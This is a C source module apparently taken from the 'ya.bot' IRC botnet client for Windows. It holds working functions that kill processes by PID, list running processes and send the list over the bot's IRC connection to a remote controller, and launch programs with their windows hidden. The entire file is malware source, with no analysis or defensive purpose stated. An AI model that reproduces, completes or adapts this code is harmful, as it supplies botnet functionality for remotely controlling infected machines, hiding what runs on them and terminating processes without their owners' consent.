/*  ya.bot  */

#include "bot.h"

bool process_killpid(DWORD dwPID)
{
	HANDLE hProcess;

#ifndef NO_DEBUG
		debug_print("Killing process by pid, process_killpid()");
#endif

	if (GetCurrentProcessId() == dwPID)
			return FALSE;
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
	if (!hProcess)
			return FALSE;
	if (TerminateProcess(hProcess, 0) != 0)
	{
			CloseHandle(hProcess);
			return TRUE;
	}
		CloseHandle(hProcess);
		return FALSE;
}

DWORD process_list(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	HANDLE hProcess;
	int nProcess = 0;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		debug_print("Listing processes, process_list()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_processlistingprocesses,
					CBLUE, string_replyprocess, CEND, string_replydotbot);
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcess, &pe32))
	{
			CloseHandle(hProcess);
			return nProcess;
	}
		nProcess++;
		Sleep(FLOOD_DELAY);
	if (!bSilent)
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_processlistprocess,
					CGREEN, string_replyprocess, CEND, string_replydotbot,
					CBLUE, CEND, nProcess,
					CBLUE, CEND, pe32.szExeFile,
					CBLUE, CEND, pe32.th32ProcessID);
		Sleep(FLOOD_DELAY);
	while (Process32Next(hProcess, &pe32))
	{
			Sleep(FLOOD_DELAY);
		if (!bSilent)
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_processlistprocess,
						CGREEN, string_replyprocess, CEND, string_replydotbot,
						CBLUE, CEND, nProcess,
						CBLUE, CEND, pe32.szExeFile,
						CBLUE, CEND, pe32.th32ProcessID);
			Sleep(FLOOD_DELAY);
			nProcess++;
	}
		CloseHandle(hProcess);
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_processendofprocesslist,
					CBLUE, string_replyprocess, CEND, string_replydotbot);
		return nProcess;
}

DWORD process_start(char *pszFilePath, bool bVisible)
{
	PROCESS_INFORMATION pInfo;
	STARTUPINFO sInfo;

#ifndef NO_DEBUG
		debug_print("Starting process, process_start()");
#endif

		memset(&sInfo, 0, sizeof(sInfo));
		memset(&pInfo, 0, sizeof(pInfo));
		sInfo.cb = sizeof(STARTUPINFO);
		sInfo.dwFlags = STARTF_USESHOWWINDOW;
	if (bVisible)
			sInfo.wShowWindow = SW_SHOW;
	else
			sInfo.wShowWindow = SW_HIDE;
	if (!CreateProcess(NULL,
				pszFilePath,
				NULL,
				NULL,
				TRUE,
				NORMAL_PRIORITY_CLASS,
				NULL,
				NULL,
				&sInfo,
				&pInfo)) return 0;
		return pInfo.dwProcessId;
}